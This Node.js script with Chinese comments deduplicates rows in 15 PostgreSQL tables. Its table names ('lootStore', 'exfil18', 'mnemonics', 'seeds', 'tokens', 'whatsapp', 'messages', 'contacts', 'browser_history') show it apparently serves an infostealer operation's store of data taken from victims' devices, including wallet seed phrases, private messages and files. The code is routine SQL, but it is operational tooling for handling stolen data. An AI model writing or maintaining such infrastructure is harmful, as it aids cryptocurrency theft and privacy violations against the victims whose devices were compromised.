#!/usr/bin/env node
/**
 * pg_dedup.js —— 存量去重（P4.3 修复配套）
 * 背景：P4 桶级入库未经过 lootStore.scan() 的全局 uniqBy 去重 → PG 存量有重复
 *   （实测 messages 11994 / exfil18 90080 重复行）。
 * 本脚本按【业务键】（与 pgStore.BIZ 一致）对 15 张表删除重复行（保留最早 id）。
 * ukey 已同步改为业务键 → 新入库天然去重；本脚本清理存量。
 * 用法: node tools/pg_dedup.js [--dry]   （--dry 只统计不删除）
 */
const path = require('path');
const BASE = path.resolve(__dirname, '..');
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const DRY = process.argv.includes('--dry');

// [表, 业务键 SQL 表达式（与 pgStore.BIZ 的 JS 键对齐）]
const JOBS = [
  ['photos', `serial || '|' || COALESCE(NULLIF(data->>'source_path',''), NULLIF(data->>'name',''), data->>'title', '')`],
  ['notebooks', `serial || '|' || COALESCE(data->>'source_path','') || '|' || COALESCE(data->>'title','') || '|' || left(COALESCE(data->>'content',''),120)`],
  ['apps', `serial || '|' || COALESCE(NULLIF(data->>'bundle_id',''), data->>'name', '')`],
  ['tokens', `serial || '|' || COALESCE(data->>'address','') || '|' || COALESCE(NULLIF(data->>'symbol',''), data->>'name','')`],
  ['whatsapp', `serial || '|' || COALESCE(NULLIF(data->>'account',''), data->>'display_name','')`],
  ['browser_history', `serial || '|' || COALESCE(data->>'source_path','') || '|' || COALESCE(data->>'url','') || '|' || COALESCE(data->>'ts','0')`],
  ['messages', `serial || '|' || COALESCE(data->>'source_path','') || '|' || COALESCE(NULLIF(data->>'who',''), data->>'from','') || '|' || COALESCE(data->>'ts','0') || '|' || COALESCE(data->>'direction','') || '|' || left(COALESCE(data->>'body',''),60)`],
  ['contacts', `serial || '|' || COALESCE(data->>'name','') || '|' || COALESCE(data->>'phones','')`],
  ['exfil18', `serial || '|' || COALESCE(data->>'path','')`],
  ['mnemonics', `serial || '|' || COALESCE(NULLIF(data->>'mnem_phrase_plain',''), data->>'mnem_phrase_abbr','')`],
  ['seeds', `serial || '|' || COALESCE(data->>'seed_abbr','') || '|' || COALESCE(data->>'app_type','')`],
  ['addresses', `serial || '|' || COALESCE(data->>'public_key','')`],
  ['uploads', `serial || '|' || COALESCE(data->>'filename','')`],
  ['chain_logs', `COALESCE(serial,'') || '|' || COALESCE(data->>'ts','0') || '|' || left(COALESCE(data->>'line',''),120)`],
  ['sys_apps', `serial || '|' || COALESCE(NULLIF(data->>'bundle_id',''), data->>'name','')`],
];

(async () => {
  let totalDel = 0;
  for (const [tbl, keyExpr] of JOBS) {
    const t0 = Date.now();
    let before = 0, dupRows = 0;
    try {
      before = (await pgStore.pool.query(`SELECT count(*)::int AS n FROM ${tbl}`)).rows[0].n;
      dupRows = (await pgStore.pool.query(`SELECT COALESCE(sum(c-1),0)::int AS n FROM (SELECT count(*) c FROM ${tbl} GROUP BY ${keyExpr}) t`)).rows[0].n;
    } catch (e) { console.log(`${tbl.padEnd(16)} 统计失败: ${e.message}`); continue; }
    if (dupRows === 0) { console.log(`${tbl.padEnd(16)} 无重复 (${before} 行)`); continue; }
    if (DRY) { console.log(`${tbl.padEnd(16)} [dry] ${before} 行, 将删除 ${dupRows}`); continue; }
    try {
      const res = await pgStore.pool.query(
        `DELETE FROM ${tbl} t USING (
           SELECT id, row_number() OVER (PARTITION BY ${keyExpr} ORDER BY id) AS rn FROM ${tbl}
         ) d WHERE t.id = d.id AND d.rn > 1`);
      totalDel += res.rowCount;
      const after = (await pgStore.pool.query(`SELECT count(*)::int AS n FROM ${tbl}`)).rows[0].n;
      console.log(`${tbl.padEnd(16)} ${before} → ${after}（删除 ${res.rowCount}） ${(Date.now() - t0) / 1000}s`);
    } catch (e) { console.log(`${tbl.padEnd(16)} 删除失败: ${e.message}`); }
  }
  console.log(`\n[dedup] ${DRY ? '（dry 模式）' : '完成'} 合计删除 ${totalDel} 行`);
  await pgStore.close();
})().catch(e => { console.error('[dedup] fatal', e); process.exit(1); });
